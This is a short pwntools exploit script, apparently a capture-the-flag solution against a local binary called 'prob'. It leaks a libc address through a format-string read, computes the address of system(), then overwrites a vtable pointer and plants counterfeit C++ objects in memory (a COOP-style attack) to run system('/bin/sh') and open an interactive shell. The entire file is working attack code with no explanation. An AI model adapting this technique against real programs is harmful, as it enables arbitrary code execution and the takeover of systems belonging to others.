from pwn import *

p=process("./prob")

pay=b"%3$lx"
p.send(pay)

libc_addr=int(p.recv(10),16)
libc_base=libc_addr-0x38a640
libc_system=libc_base+0x40890

coop_buf=0x412090
course_vtable=0x411db0
exam_vtable=0x411d98
simplestring_vtable=0x411d78
log.info("libc_base:"+hex(libc_base))
log.info("libc_system:"+hex(libc_system))

pay=b"A"*0x20
pay+=p64(course_vtable)
pay+=p64(coop_buf)
pay+=p64(3)
p.send(pay)

#Counterfeit Object
pay=b""
pay+=p64(coop_buf+0x100) #-> cobj1
pay+=p64(coop_buf+0x120) #-> cobj2
pay+=p64(coop_buf+0x148) #-> cobj3
pay+=b"A"*(0x100-len(pay))

#cobj1 (exam)
pay+=p64(exam_vtable-8)
pay+=p64(0x412020)
pay+=p64(0x0)
pay+=p64(0x0)
pay+=p64(simplestring_vtable-8)#*topic == cobj2 (SimpleString)
pay+=p64(0)                 #score == #dest
pay+=p64(coop_buf+0x140)    #src
pay+=p64(0x8)               #len
pay+=p64(libc_system)

#cobj3 (SimpleString)
binsh=coop_buf+0x158
pay+=p64(simplestring_vtable-8)
pay+=p64(binsh)
pay+=b"/bin/sh\x00"

p.send(pay)
p.interactive()
